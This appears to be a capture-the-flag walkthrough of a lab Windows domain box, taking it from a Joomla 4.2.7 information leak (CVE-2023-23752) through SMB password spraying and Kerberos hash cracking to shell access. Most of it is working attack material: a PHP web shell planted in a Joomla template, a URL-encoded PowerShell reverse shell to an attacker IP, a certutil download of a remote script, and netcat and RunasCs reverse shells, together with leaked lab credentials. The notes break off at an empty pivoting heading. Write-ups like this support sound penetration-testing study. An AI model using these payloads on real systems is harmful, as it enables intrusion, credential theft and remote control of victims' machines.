# Joomla
The website that is running is running joomla!
![[Pasted image 20240502151310.png]]

# CVE-2023-23752
The joomla version which is 4.2.7 is vulnerable to unauthenticated information disclosure. Using this and the metasploit module down below we were able to get some creds
```shell
msf6 auxiliary(scanner/http/joomla_api_improper_access_checks) > run

[+] Users JSON saved to /home/kali/.msf4/loot/20240502104859_default_10.10.11.3_joomla.users_145546.bin
[+] Joomla Users
============

 ID   Super User  Name        Username       Email                      Send Email  Register Date        Last Visit Date      Group Names
 --   ----------  ----        --------       -----                      ----------  -------------        ---------------      -----------
 474  *           Tony Stark  Administrator  Administrator@holography.  1           2023-04-13 23:27:32  2024-01-24 13:00:47  Super Users
                                             htb

[+] Config JSON saved to /home/kali/.msf4/loot/20240502104859_default_10.10.11.3_joomla.config_230322.bin
[+] Joomla Config
=============

 Setting        Value
 -------        -----
 db encryption  0
 db host        localhost
 db name        joomla_db
 db password    H0lOgrams4reTakIng0Ver754!
 db prefix      if2tx_
 db user        root
 dbtype         mysqli

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

# Valid SMB Creds
I was able to bruteforce a username using the password
```shell
└─$ crackmapexec smb 10.10.11.3 -u valid_usernames.txt -p 'H0lOgrams4reTakIng0Ver754!'
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [-] office.htb\Administrator@office.htb:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\ewhite@office.htb:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\etower@office.htb:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\dwolfe@office.htb:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\dmichael@office.htb:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\dlanor@office.htb:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\hhogan@office.htb:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\DWOLFE@office.htb:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\DLANOR@office.htb:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\tstark@office.htb:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\Administrator:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\ewhite:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\etower:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754! 
```

# PCAP
Found a nice pcap file in the shares also found a hashed cipher
```pcap
Frame 1917: 323 bytes on wire (2584 bits), 323 bytes captured (2584 bits) on interface unknown, id 0
Ethernet II, Src: PCSSystemtec_a4:08:70 (08:00:27:a4:08:70), Dst: PCSSystemtec_34:d8:9e (08:00:27:34:d8:9e)
Internet Protocol Version 4, Src: 10.250.0.41, Dst: 10.250.0.30
Transmission Control Protocol, Src Port: 33550, Dst Port: 88, Seq: 1, Ack: 1, Len: 257
Kerberos
    Record Mark: 253 bytes
        0... .... .... .... .... .... .... .... = Reserved: Not set
        .000 0000 0000 0000 0000 0000 1111 1101 = Record Length: 253
    as-req
        pvno: 5
        msg-type: krb-as-req (10)
        padata: 2 items
            PA-DATA pA-ENC-TIMESTAMP
                padata-type: pA-ENC-TIMESTAMP (2)
                    padata-value: 3041a003020112a23a0438a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc
                        etype: eTYPE-AES256-CTS-HMAC-SHA1-96 (18)
                        cipher: a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc
            PA-DATA pA-PAC-REQUEST
                padata-type: pA-PAC-REQUEST (128)
                    padata-value: 3005a0030101ff
                        include-pac: True
        req-body
            Padding: 0
            kdc-options: 50800000
                0... .... = reserved: False
                .1.. .... = forwardable: True
                ..0. .... = forwarded: False
                ...1 .... = proxiable: True
                .... 0... = proxy: False
                .... .0.. = allow-postdate: False
                .... ..0. = postdated: False
                .... ...0 = unused7: False
                1... .... = renewable: True
                .0.. .... = unused9: False
                ..0. .... = unused10: False
                ...0 .... = opt-hardware-auth: False
                .... 0... = unused12: False
                .... .0.. = unused13: False
                .... ..0. = constrained-delegation: False
                .... ...0 = canonicalize: False
                0... .... = request-anonymous: False
                .0.. .... = unused17: False
                ..0. .... = unused18: False
                ...0 .... = unused19: False
                .... 0... = unused20: False
                .... .0.. = unused21: False
                .... ..0. = unused22: False
                .... ...0 = unused23: False
                0... .... = unused24: False
                .0.. .... = unused25: False
                ..0. .... = disable-transited-check: False
                ...0 .... = renewable-ok: False
                .... 0... = enc-tkt-in-skey: False
                .... .0.. = unused29: False
                .... ..0. = renew: False
                .... ...0 = validate: False
            cname
                name-type: kRB5-NT-PRINCIPAL (1)
                cname-string: 1 item
                    CNameString: tstark
            realm: OFFICE.HTB
            sname
                name-type: kRB5-NT-PRINCIPAL (1)
                sname-string: 2 items
                    SNameString: krbtgt
                    SNameString: OFFICE.HTB
            till: May  8, 2023 20:57:21.000000000 EDT
            rtime: May  8, 2023 20:57:21.000000000 EDT
            nonce: 369478355
            etype: 1 item
                ENCTYPE: eTYPE-AES256-CTS-HMAC-SHA1-96 (18)

```

# Cracking the Cipher
So the cipher can be crack by setting the hash in the specific setup needed to crack Krb5pa hashes
```shell

$krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc

```
## cracked
```shell
└─$ hashcat -m 19900 krbtgt.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-Intel(R) Core(TM) i9-9980HK CPU @ 2.40GHz, 4580/9224 MB (2048 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc:playboy69
                                                          
Session..........: hashcat
Status...........: Cracked

```


# Administrator login
Using the creds for tstark but the username Administrator I was able to login in
![[Pasted image 20240502202548.png]]

# Web shell
By customizing a template we can inject our web shell code
```php
system($_GET['cmd']);
```
![[Pasted image 20240502204056.png]]
This will result in us getting RCE
![[Pasted image 20240502204117.png]]

# Reverse Shell
Using the web-shell I was able to get a reverse shell onto the windows box 

## Payload
```shell
└─$ curl -s http://10.10.11.3/templates/cassiopeia/error.php?cmd=powershell%20-nop%20-W%20hidden%20-noni%20-ep%20bypass%20-c%20%22%24TCPClient%20%3D%20New-Object%20Net.Sockets.TCPClient%28%2710.10.14.12%27%2C%208001%29%3B%24NetworkStream%20%3D%20%24TCPClient.GetStream%28%29%3B%24StreamWriter%20%3D%20New-Object%20IO.StreamWriter%28%24NetworkStream%29%3Bfunction%20WriteToStream%20%28%24String%29%20%7B%5Bbyte%5B%5D%5D%24script%3ABuffer%20%3D%200..%24TCPClient.ReceiveBufferSize%20%7C%20%25%20%7B0%7D%3B%24StreamWriter.Write%28%24String%20%2B%20%27SHELL%3E%20%27%29%3B%24StreamWriter.Flush%28%29%7DWriteToStream%20%27%27%3Bwhile%28%28%24BytesRead%20%3D%20%24NetworkStream.Read%28%24Buffer%2C%200%2C%20%24Buffer.Length%29%29%20-gt%200%29%20%7B%24Command%20%3D%20%28%5Btext.encoding%5D%3A%3AUTF8%29.GetString%28%24Buffer%2C%200%2C%20%24BytesRead%20-%201%29%3B%24Output%20%3D%20try%20%7BInvoke-Expression%20%24Command%202%3E%261%20%7C%20Out-String%7D%20catch%20%7B%24_%20%7C%20Out-String%7DWriteToStream%20%28%24Output%29%7D%24StreamWriter.Close%28%29%22
```
![[Pasted image 20240502204735.png]]

# RunAs Tstark
Since we have tonys password we can use the runas command
```powershell
SHELL> certutil -urlcache -split -f http://10.10.14.12:8081/Invoke-RunasCs.ps1
****  Online  ****
  000000  ...
  0158dc
CertUtil: -URLCache command completed successfully.
SHELL> dir


    Directory: C:\Users\web_account\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----          5/3/2024   8:31 AM          88284 Invoke-RunasCs.ps1                                                   


SHELL> Import-Module ./Invoke-RunasCs.ps1
SHELL> Invoke-RunasCs -Username tstark -Password playboy69 -Command "whoami"

office\tstark

SHELL> 

```

```shell
Start-Process -FilePath C:\Users\web_account\Desktop\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nc","10.10.14.12","4444","-e","cmd.exe") -WorkingDirectory C:\Users\web_account
```

# Reverse shell as tstark
Download the RunasCs.exe from github and run this command
```powershell
SHELL> .\RunasCs.exe tstark playboy69 cmd.exe -r 10.10.14.12:4444
```

### Listener
```shell
└─$ rlwrap nc -lvnp 4444         
listening on [any] 4444 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.3] 50990
Microsoft Windows [Version 10.0.20348.2322]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>

```

# Pivoting
Found this port
```shell
 TCP    0.0.0.0:8083           0.0.0.0:0              LISTENING       5088

```

## The Pivot